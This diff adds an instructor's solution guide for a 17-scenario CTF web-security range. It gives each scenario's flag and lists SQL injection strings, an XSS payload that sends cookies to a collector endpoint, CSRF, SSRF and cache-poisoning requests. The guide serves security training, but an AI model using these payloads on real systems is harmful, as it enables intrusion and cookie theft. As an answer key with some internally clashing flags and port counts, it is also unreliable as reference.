@@ -1,0 +1,160 @@
+# CSZone Offensive Security Range — Master Solutions Guide (Multi-Port Architecture)
+
+**Confidential — Instructor & Administrator Reference Only**
+
+This guide documents the full 16-port modular architecture for the CSZone CTF Range. Each scenario is isolated on its own dedicated port for clean VPS deployment and professional training execution.
+
+---
+
+## Port Map & Flag Summary Table
+
+| Port | Scenario Name | Category | Vulnerability Class | Flag(s) |
+|---|---|---|---|---|
+| **8000** | Central Operations Hub | Platform / Landing Portal | Read-Only Scenario Directory & Dispatcher | N/A (Main Portal) |
+| **8001** | Scenario 01: Target Recon | Recon / HTTP | Developer Note Clue & HTTP Header Leak | `CTF{h34d3r_hunt3r_pr0}` |
+| **8002** | Scenario 02: Robots & Ops | Recon / Traversal | Robots.txt & Sensitive Directory Traversal | `CTF{r0b0ts_d1scl0s3_p4ths}` |
+| **8003** | Scenario 03: JS & Crypto | Cryptography | Obfuscated Token & Single-Byte XOR | `CTF{unus3d_v4r14bl3_l34k}` |
+| **8004** | Scenario 04: Admin Portal | Access Control | Console Log Leak & Unprotected Admin URL | `CTF{4dm1n_p4n3l_3xp0s3d}` |
+| **8005** | Scenario 05: IDOR Invoices | Web / IDOR | Parameter Tampering & Confidential Note Leak | `CTF{1d0r_1nv01c3_l34k}` |
+| **8006** | Scenario 06: Crypto & Cookie | Access Control | Partner Token Discovery & Cookie Gateway Bypass | `CTF{h34d3r_c00k13_byp4ss}` |
+| **8007** | Scenario 07: Backup Service | Auth / Brute-Force | Salted SHA-256 Hash Cracking & Burp Intruder | `CTF{h4sh_cr4ck3d_4cc3ss}` |
+| **8008** | Scenario 08: Vault Finale | Chained Crypto | Dual-Key Gateway & Multi-Byte XOR Decryption | `CTF{f1n4l_ch41n_c0mpl3t3}` |
+| **8009** | Scenario 09: Products SQLi | SQL Injection | E-Commerce Filter Boolean Bypass & UNION SQLi | `CTF{un10n_b4s1cs_m4st3r}` |
+| **8010** | Scenario 10: Personnel SQLi | SQL Injection | 3-Column UNION-based Database Extraction | `CTF{un10n_s3l3ct_m4st3r}` |
+| **8011** | Scenario 11: Asset Inventory SQLi | SQL Injection | Double Quotes, '#' Comments & Schema Enumeration | `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}` |
+| **8012** | Scenario 12: SQLi & XSS | SQLi + Stored XSS | Legacy Admin SQLi Bypass & Stored Cookie Theft | `CTF{st0r3d_c00k13_th3ft}` |
+| **8013** | Scenario 13: CSRF Account | CSRF | Cross-Site Request Forgery State Change | `CTF{csrf_n0_t0k3n_pwn3d}` |
+| **8014** | Scenario 14: File Upload | Upload / Stored XSS | Blocklist Bypass & Direct Script Execution | Verified HTML/JS Execution |
+| **8015** | Scenario 15: SSRF Metadata | SSRF | Internal Loopback Cloud Metadata Retrieval | `CTF{ssrf_1nt3rn4l_m3t4d4t4}` |
+| **8016** | Scenario 16: Backend IDOR | Web / IDOR | Order Object Reference & Audit Note Leak | `CTF{b4ck3nd_1d0r_r34l}` |
+| **8017** | Scenario 17: Cache Attacks | Web Cache Attacks | Web Cache Deception & Host Cache Poisoning | `CTF{c4ch3_d3c3pt10n_l34k}` |
+
+---
+
+## Detailed Scenario Solutions
+
+### Scenario 01 (Port 8001) — Target Reconnaissance
+- **URL:** `http://<host>:8001/`
+- **Steps:**
+  1. Inspect HTML source (`Ctrl+U`): Top comment contains `CTF{h1dd3n_1n_pl41n_s1ght}`.
+  2. Inspect response headers (`curl -I http://<host>:8001/`): `X-Debug-Info` header contains `CTF{h34d3r_hunt3r_pr0}`.
+
+### Scenario 02 (Port 8002) — Robots & Ops Archive
+- **URL:** `http://<host>:8002/`
+- **Steps:**
+  1. Fetch `/robots.txt` -> reveals `/recon-notes/`.
+  2. View source on `/recon-notes/` -> comment reveals `ops-archive/`.
+  3. View source on `/recon-notes/ops-archive/` -> comment reveals `session-dump.log`.
+  4. Fetch `/recon-notes/ops-archive/session-dump.log` -> extract `Q1RGe3IwYjB0c19kMXNjbDAzM19wNHRoc30=` -> Base64 decode to `CTF{r0b0ts_d1scl0s3_p4ths}`.
+
+### Scenario 03 (Port 8003) — JavaScript & XOR Cryptography
+- **URL:** `http://<host>:8003/`
+- **Steps:**
+  1. Inspect `main.js`: `window.__c = 'FgETLiA7ICZmMQojYSdkYTc5Zgo5ZmE+KA=='`.
+  2. Inspect `js-config.json`: `"dbg_key": 85`.
+  3. Base64 decode and single-byte XOR against `85` -> `CTF{unus3d_v4r14bl3_l34k}`.
+
+### Scenario 04 (Port 8004) — Admin Relocation
+- **URL:** `http://<host>:8004/`
+- **Steps:**
+  1. Open DevTools Console -> decode logged Base64 string `QWRtaW4gcGFuZWwgcmVsb2NhdGVkIHRvIC9wYW5lbC03YzRmMmEv` -> reveals `/panel-7c4f2a/`.
+  2. Navigate to `http://<host>:8004/panel-7c4f2a/` -> read `CTF{4dm1n_p4n3l_3xp0s3d}`.
+
+### Scenario 05 (Port 8005) — IDOR Invoices
+- **URL:** `http://<host>:8005/invoices/invoice.html?id=1001`
+- **Steps:**
+  1. Inspect `invoices.json` or tamper `id` parameter to `1007`.
+  2. Record 1007 internal notes contain `Q1RGezFkMHJfMW52MDFjM19sMzRrfQ==` -> Base64 decode to `CTF{1d0r_1nv01c3_l34k}`.
+
+### Scenario 06 (Port 8006) — Partner Promo & Client Cookie Gateway Guard
+- **URL:** `http://<host>:8006/`
+- **Steps:**
+  1. Inspect `/robots.txt` -> reveals `/promo-page/` and `/secure/`.
+  2. Visit `/promo-page/` -> extract encoded partner credential token `YWNjZXNzX2xldmVsPWFkbWluLTlmM2E=`.
+  3. Base64 decode to `access_level=admin-9f3a`.
+  4. Visit `/secure/` (initially `403 Access Denied`). Set `Cookie: access_level=admin-9f3a` via Browser DevTools / Header and refresh.
+  5. Gateway unlocks and renders `Q1RGe2gzNGQzcl9jMDBrMTNfYnlwNHNzfQ==` -> decodes to flag `CTF{h34d3r_c00k13_byp4ss}`.
+
+### Scenario 07 (Port 8007) — Backup Service Authentication
+- **URL:** `http://<host>:8007/backup/login.html`
+- **Credentials:** Username `svc_backup`, Salt `9c1f7a`, Password `Summer2024!`
+- **Steps:**
+  1. Inspect `/backup/users.json` for target schema.
+  2. Brute-force `/backup/login.html` with Burp Intruder using candidate list.
+  3. Submit `svc_backup` and `Summer2024!` -> unlocks `Q1RGe2g0c2hfY3I0Y2szZF80Y2Mzc3N9` -> `CTF{h4sh_cr4ck3d_4cc3ss}`.
+
+### Scenario 08 (Port 8008) — Central Security Vault Finale
+- **URL:** `http://<host>:8008/finale/index.html`
+- **Steps:**
+  1. Send request with `Cookie: access_level=admin-9f3a` and `?key=Summer2024!`.
+  2. Server returns/decrypts ciphertext `ECErFgNDXARea0I7QVwDOhECXUJYEidGEA==` using key `Summer2024!` to `CTF{ch41n_c0mpl3t3_m4st3r}`.
+
+### Scenario 09 (Port 8009) — Products SQL Injection
+- **URL:** `http://<host>:8009/products`
+- **Steps:**
+  1. Boolean bypass: `/products?category=Hardware' OR 1=1 -- -`.
+  2. UNION extraction: `/products?category=nonexistent' UNION SELECT title, secret_flag FROM site_secrets -- -`.
+  3. Flag: `CTF{un10n_b4s1cs_m4st3r}`.
+
+### Scenario 10 (Port 8010) — Personnel Directory UNION SQLi (Data Type Sequence)
+- **URL:** `http://<host>:8010/directory?q=`
+- **Steps:**
+  1. Test comment: `--` is blocked; `#` (`%23`) is required.
+  2. Test column count: `ORDER BY 3%23` (200 OK), `ORDER BY 4%23` (500 Error) -> 3 Columns.
+  3. Test data type sequence:
+     - `UNION SELECT 'STR1', 'STR2', 'STR3'%23` -> 500 Error (Column 2 is an INTEGER / Numeric column).
+     - `UNION SELECT 'STR1', 1337, 'STR3'%23` -> 200 OK (Sequence verified: `TEXT, INTEGER, TEXT`).
+  4. Extract flag from `staff_clearances` table:
+     - `UNION SELECT officer_name, clearance_level, master_flag FROM staff_clearances%23`
+     - Captures flag `CTF{un10n_s3l3ct_m4st3r}`.
+
+### Scenario 11 (Port 8011) — Enterprise Asset Inventory (Schema Enumeration SQLi)
+- **URL:** `http://<host>:8011/inventory?q=`
+- **Steps:**
+  1. **Closing String & Comment:** Parameter is enclosed in double quotes `"`. Test `Servers" #` to break out (`--` is blocked).
+  2. **4-Column Typed UNION:** Verify column count and datatypes:
+     - `" UNION SELECT 'a', 'b', 1, 1 #` -> 200 OK (Sequence verified: `TEXT, TEXT, INTEGER, INTEGER`).
+  3. **Schema Enumeration:** Enumerate tables from SQLite master:
+     - `" UNION SELECT type, name, 1, 1 FROM sqlite_master WHERE type="table" #` -> reveals `classified_vault_records`.
+     - `" UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master WHERE tbl_name="classified_vault_records" #` -> reveals columns `(record_name, flag_data, access_pin, vault_level)`.
+  4. **Flag Extraction:**
+     - `" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #`
+     - Captures flag: `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`.
+
+### Scenario 12 (Port 8012) — Legacy Admin SQLi + Stored XSS Chain
+- **URL:** `http://<host>:8012/`
+- **Steps:**
+  1. Post XSS payload to `/guestbook`: `<img src=x onerror="fetch('/xss/collect?c='+encodeURIComponent(document.cookie))">`.
+  2. Bypass login at `/legacy-admin/login` using `admin' OR '1'='1' -- -` (sets cookie `admin_session_flag=CTF{st0r3d_c00k13_th3ft}`).
+  3. Visit `/admin/inbox` -> triggers beacon -> inspect `/xss/collect/log` to capture `CTF{st0r3d_c00k13_th3ft}`.
+
+### Scenario 13 (Port 8013) — CSRF Account Email
+- **URL:** `http://<host>:8013/`
+- **Steps:**
+  1. Log in to account.
+  2. Fire unauthenticated cross-site POST to `/account/email` with `email=pwned@attacker-controlled.test`.
+  3. Flag: `CTF{csrf_n0_t0k3n_pwn3d}`.
+
+### Scenario 14 (Port 8014) — Unrestricted File Upload
+- **URL:** `http://<host>:8014/upload`
+- **Steps:**
+  1. Upload `pwn.html` containing `<script>...</script>`.
+  2. Fetch `/static/uploads/pwn.html` to confirm execution.
+
+### Scenario 15 (Port 8015) — Server-Side Request Forgery (SSRF)
+- **URL:** `http://<host>:8015/avatar-import`
+- **Steps:**
+  1. Post `url=http://127.0.0.1:8015/internal/metadata`.
+  2. Server returns JSON metadata containing `CTF{ssrf_1nt3rn4l_m3t4d4t4}`.
+
+### Scenario 16 (Port 8016) — Backend IDOR Orders
+- **URL:** `http://<host>:8016/orders`
+- **Steps:**
+  1. Access `/orders/2` directly without authorization.
+  2. Order notes contain `CTF{b4ck3nd_1d0r_r34l}`.
+
+### Scenario 17 (Port 8017) — Web Cache Attacks
+- **URL:** `http://<host>:8017/`
+- **Steps:**
+  1. **Cache Deception:** Log in as victim, request `/account/profile/legacy-theme.css`. Issue unauthenticated GET to the same path -> cache HIT returns `CTF{c4ch3_d3c3pt10n_l34k}`.
+  2. **Cache Poisoning:** GET `/promo/partner-banner` with `X-Forwarded-Host: evil-attacker-domain.test` -> primes cache for all visitors.
